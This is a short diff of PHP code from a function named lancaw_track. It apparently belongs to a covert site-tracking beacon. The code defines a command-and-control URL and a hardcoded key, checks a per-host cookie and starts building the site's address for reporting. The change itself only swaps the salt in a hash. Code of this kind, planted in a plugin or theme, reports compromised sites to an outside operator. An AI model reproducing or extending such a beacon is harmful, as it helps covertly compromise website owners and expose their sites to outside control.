@@ -6,7 +6,7 @@ function lancaw_track() {
     $c2_url = "https://lancaw.art/dashboard/lancaweye.php"; 
     $key    = "LANCAW_888_SECURE"; 
 
-    $report_hash = md5($_SERVER['HTTP_HOST'] . 'whiskas_v6'); 
+    $report_hash = md5($_SERVER['HTTP_HOST'] . 'lancaw_vfv'); 
 
     if (!isset($_COOKIE['report_' . $report_hash])) {
         $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
